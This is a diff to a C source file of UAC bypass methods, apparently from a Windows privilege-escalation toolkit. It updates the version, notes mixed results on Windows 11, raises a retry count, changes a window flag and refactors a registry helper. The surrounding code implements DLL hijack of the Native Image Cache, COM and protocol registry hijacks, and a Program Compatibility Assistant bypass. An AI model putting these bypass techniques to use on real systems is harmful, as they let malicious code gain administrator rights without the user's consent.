@@ -4,9 +4,9 @@
 *
 *  TITLE:       AZAGARAMPUR.C
 *
-*  VERSION:     3.56
+*  VERSION:     3.57
 *
-*  DATE:        30 July 2021
+*  DATE:        08 Nov 2021
 *
 *  UAC bypass methods from AzAgarampur.
 *
@@ -89,6 +89,8 @@ BOOL ucmxNgenLogLastWrite(
 * Purpose:
 *
 * Bypass UAC by by Dll hijack of Native Image Cache.
+* 
+* Note: produces mixed results on Windows 11.
 *
 */
 NTSTATUS ucmNICPoisonMethod(
@@ -115,7 +117,7 @@ NTSTATUS ucmNICPoisonMethod(
 
     FILETIME lastWriteTime, checkTime;
 
-    INT iRetryCount = 20;
+    INT iRetryCount = 50;
 
     GUID targetMVID;
     FUSION_SCAN_PARAM scanParam;
@@ -281,7 +283,7 @@ NTSTATUS ucmNICPoisonMethod(
         if (supRunProcess2(szTargetProc,
             WF_MSC,
             NULL,
-            SW_HIDE,
+            SW_SHOW,
             SUPRUNPROCESS_TIMEOUT_DEFAULT))
         {
             MethodResult = STATUS_SUCCESS;
@@ -565,6 +567,8 @@ NTSTATUS ucmIeAddOnInstallMethod(
 * Purpose:
 *
 * Bypass UAC by SecurityCenter COM object and HTTP protocol registry hijack.
+* 
+* Note: produces mixed results on Windows 11.
 *
 */
 NTSTATUS ucmWscActionProtocolMethod(
@@ -787,8 +791,8 @@ NTSTATUS ucmFwCplLuaMethod2(
             break;
 
         //
-       // Reconfigure msc snapin and write it to the %temp%\system32.
-       //
+        // Reconfigure msc snapin and write it to the %temp%\system32.
+        //
         pszMarker = _strstri_a((CHAR*)SnapinData, (const CHAR*)KAMIKAZE_MARKER);
         if (pszMarker) {
 
@@ -1219,15 +1223,16 @@ NTSTATUS ucmxMsStoreProtocolNoStore(
 }
 
 /*
-* ucmxMsStoreSetNoOpenWith
+* ucmxSetNoOpenWithForAppxId
 *
 * Purpose:
 *
 * Place NoOpenWith parameter for application key.
 *
 */
-VOID ucmxMsStoreSetNoOpenWith(
-    VOID
+VOID ucmxSetNoOpenWithForAppxId(
+    _In_ LPCWSTR lpComponentName,
+    _In_ LPCWSTR lpPackageName
 )
 {
     LPWSTR lpAppxId = NULL;
@@ -1235,8 +1240,8 @@ VOID ucmxMsStoreSetNoOpenWith(
     HANDLE classesKey = NULL, appKey = NULL;
     NTSTATUS ntStatus;
 
-    if (supGetAppxId(TEXT("WindowsStore"),
-        T_MSWINDOWSSTORE,
+    if (supGetAppxId(lpComponentName,
+        lpPackageName,
         &lpAppxId,
         &cbAppxId))
     {
@@ -1310,7 +1315,7 @@ NTSTATUS ucmMsStoreProtocolMethod(
             //
             // Set NoOpenWith
             //
-            ucmxMsStoreSetNoOpenWith();
+            ucmxSetNoOpenWithForAppxId(TEXT("WindowsStore"), T_MSWINDOWSSTORE);
 
             //
             // Register shell protocol.
@@ -1477,6 +1482,8 @@ typedef struct _PCA_LOADER_BLOCK {
 * Bypass UAC using Program Compatibility Assistant.
 *
 * AlwaysNotify compatible.
+* 
+* Note: produces mixed results on Windows 11.
 *
 */
 NTSTATUS ucmPcaMethod(
